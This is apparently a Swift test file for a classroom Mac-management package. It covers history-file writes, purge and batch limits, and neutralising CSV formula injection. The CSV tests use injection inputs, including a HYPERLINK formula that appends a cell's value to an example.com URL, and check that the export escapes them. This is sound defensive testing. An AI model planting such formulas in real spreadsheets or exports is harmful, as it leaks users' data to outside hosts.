import Foundation
import Testing
@testable import CMCRCore

// Tests for the P2 audit items of the CMCRCore package (AUDIT.md). Each test reproduces the reported problem.

private func p2TemporaryDirectory(_ tag: String) throws -> URL {
    let url = FileManager.default.temporaryDirectory.appendingPathComponent("cmcr-p2-\(tag)-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
    return url
}

private func p2Record(_ host: String, batch: UUID, start: Date, finished: Date? = nil) -> JobRecord {
    JobRecord(id: UUID(), batchID: batch, title: "Polecenie", section: "commands", operatorName: "nauczyciel@Mac",
              hostID: UUID(), host: host, address: "\(host).local", state: "succeeded", exitCode: 0,
              batchStartedAt: start, startedAt: start, finishedAt: finished ?? start.addingTimeInterval(2),
              summary: "ok", outputFile: nil, outputBytes: 0)
}

// MARK: - ZAD-04: a history write never replaces the month file

struct P2JobHistoryWriteTests {
    /// AUDIT ZAD-04: when the month file exists but cannot be opened for writing, the old code fell back to an
    /// atomic write (temporary file + rename, which only needs the folder to be writable) and replaced the whole
    /// month of history with the one new line.
    @Test func aMonthFileThatCannotBeOpenedIsNotReplaced() throws {
        let dir = try p2TemporaryDirectory("history")
        let now = Date()
        let file = JobHistory.monthFile(for: now, in: dir)
        defer {
            chmod(file.path, 0o644)
            try? FileManager.default.removeItem(at: dir)
        }
        let earlier = p2Record("imac01", batch: UUID(), start: now.addingTimeInterval(-60))
        try JobHistory.write(earlier, output: nil, in: dir)
        let before = try Data(contentsOf: file)
        #expect(JobHistory.decodeLines(before).count == 1)

        chmod(file.path, 0o444)
        #expect(throws: (any Error).self) {
            try JobHistory.write(p2Record("imac02", batch: UUID(), start: now), output: nil, in: dir)
        }
        #expect(try Data(contentsOf: file) == before, "plik miesiąca został zastąpiony")
    }

    @Test func aMissingMonthFileIsCreatedAndLaterLinesAreAppended() throws {
        let dir = try p2TemporaryDirectory("history")
        defer { try? FileManager.default.removeItem(at: dir) }
        let now = Date()
        try JobHistory.write(p2Record("imac01", batch: UUID(), start: now), output: "wynik\n", in: dir)
        try JobHistory.write(p2Record("imac02", batch: UUID(), start: now), output: nil, in: dir)
        let lines = JobHistory.decodeLines(try Data(contentsOf: JobHistory.monthFile(for: now.addingTimeInterval(2), in: dir)))
        #expect(lines.map(\.host) == ["imac01", "imac02"])
    }
}

// MARK: - ZAD-05: the history list matches what the purge keeps, and the limit never cuts a batch

private func p2Date(_ y: Int, _ m: Int, _ d: Int, _ h: Int = 12, _ min: Int = 0) -> Date {
    Calendar.current.date(from: DateComponents(year: y, month: m, day: d, hour: h, minute: min))!
}

struct P2JobHistoryLoadTests {
    /// AUDIT ZAD-05: the purge deletes outputs day by day but month files only once the whole month is older than
    /// 90 days, so records up to ~120 days old stayed on the list with their output already gone.
    @Test func recordsOlderThanTheKeptPeriodAreNotListed() throws {
        let dir = try p2TemporaryDirectory("history")
        defer { try? FileManager.default.removeItem(at: dir) }
        let now = p2Date(2026, 10, 28)
        let old = p2Record("imac01", batch: UUID(), start: p2Date(2026, 7, 15))
        let kept = p2Record("imac02", batch: UUID(), start: p2Date(2026, 8, 10))
        try JobHistory.write(old, output: nil, in: dir)
        try JobHistory.write(kept, output: nil, in: dir)
        JobHistory.purge(olderThan: 90, now: now, in: dir)
        #expect(FileManager.default.fileExists(atPath: JobHistory.monthFile(for: old.finishedAt, in: dir).path),
                "plik lipca zostaje (miesiąc nie jest jeszcze w całości starszy niż 90 dni)")
        #expect(JobHistory.load(in: dir, now: now).map(\.host) == ["imac02"])
    }

    @Test func theLimitKeepsWholeBatches() throws {
        let dir = try p2TemporaryDirectory("history")
        defer { try? FileManager.default.removeItem(at: dir) }
        let now = Date()
        let newer = UUID(), older = UUID()
        for (i, host) in ["imac01", "imac02", "imac03"].enumerated() {
            let t = now.addingTimeInterval(-7200)
            try JobHistory.write(p2Record(host, batch: older, start: t, finished: t.addingTimeInterval(Double(i))),
                                 output: nil, in: dir)
        }
        for (i, host) in ["imac01", "imac02", "imac03"].enumerated() {
            let t = now.addingTimeInterval(-3600)
            try JobHistory.write(p2Record(host, batch: newer, start: t, finished: t.addingTimeInterval(Double(i))),
                                 output: nil, in: dir)
        }
        let four = JobHistory.load(limit: 4, in: dir, now: now)
        #expect(four.count == 6, "najstarsza wczytana partia nie może być niepełna")
        #expect(JobHistory.batches(four).map(\.records.count) == [3, 3])
        #expect(Set(JobHistory.load(limit: 3, in: dir, now: now).map(\.batchID)) == [newer])
    }

    /// A batch that runs over midnight at the end of a month has records in two month files.
    @Test func aBatchSpanningTwoMonthFilesIsLoadedWhole() throws {
        let dir = try p2TemporaryDirectory("history")
        defer { try? FileManager.default.removeItem(at: dir) }
        let now = p2Date(2026, 10, 28)
        let newest = UUID(), spanning = UUID()
        let start = p2Date(2026, 8, 31, 23, 50)
        try JobHistory.write(p2Record("imac01", batch: spanning, start: start, finished: start.addingTimeInterval(60)),
                             output: nil, in: dir)
        try JobHistory.write(p2Record("imac02", batch: spanning, start: start, finished: p2Date(2026, 9, 1, 0, 5)),
                             output: nil, in: dir)
        try JobHistory.write(p2Record("imac01", batch: newest, start: p2Date(2026, 10, 2)), output: nil, in: dir)
        try JobHistory.write(p2Record("imac02", batch: newest, start: p2Date(2026, 10, 2)), output: nil, in: dir)
        let records = JobHistory.load(limit: 3, in: dir, now: now)
        #expect(JobHistory.batches(records).map(\.records.count) == [2, 2])
    }
}

// MARK: - KOM-14, ZAJ-02: exported cells are never formulas

struct P2CSVFormulaTests {
    /// AUDIT KOM-14, ZAJ-02: students' answers and app versions read from the student's Applications folder went
    /// into the CSV as they were, so a value starting with "=" opened in Excel/Numbers as a formula.
    @Test func cellsThatASpreadsheetWouldEvaluateAreNeutralised() {
        #expect(CSV.escape("=1+1") == "'=1+1")
        #expect(CSV.escape("+48 123") == "'+48 123")
        #expect(CSV.escape("-1+2") == "'-1+2")
        #expect(CSV.escape("@SUM(A1)") == "'@SUM(A1)")
        #expect(CSV.escape("\t=1") == "'\t=1")
        #expect(CSV.escape("\r=1") == "\"'\r=1\"")
        let link = #"=HYPERLINK("https://example.com/?"&A2;"6.0")"#
        #expect(CSV.escape(link) == #""'=HYPERLINK(""https://example.com/?""&A2;""6.0"")""#)
        let file = CSV.render([["Komputer", "Odpowiedź"], ["imac01", "=1+1"]], bom: false)
        #expect(file == "Komputer;Odpowiedź\r\nimac01;'=1+1\r\n")
    }

    @Test func plainTextAndNumbersStayAsTheyAre() {
        #expect(CSV.escape("imac01") == "imac01")
        #expect(CSV.escape("-5") == "-5")
        #expect(CSV.escape("+3") == "+3")
        #expect(CSV.escape("-1,5") == "-1,5")
        #expect(CSV.escape("6.0 (1234)") == "6.0 (1234)")
        #expect(CSV.escape("a=b") == "a=b")
    }

    /// „Kopiuj” puts tab-separated text on the clipboard, which a spreadsheet evaluates on paste as well.
    @Test func copiedTableTextIsNeutralisedAndKeepsItsShape() {
        let text = CSV.tsv([["imac01", "Ala", "=1+1"], ["imac02", "Ola", "dwie\nlinie\tz tabulatorem"]])
        #expect(text == "imac01\tAla\t'=1+1\nimac02\tOla\tdwie linie z tabulatorem")
    }
}
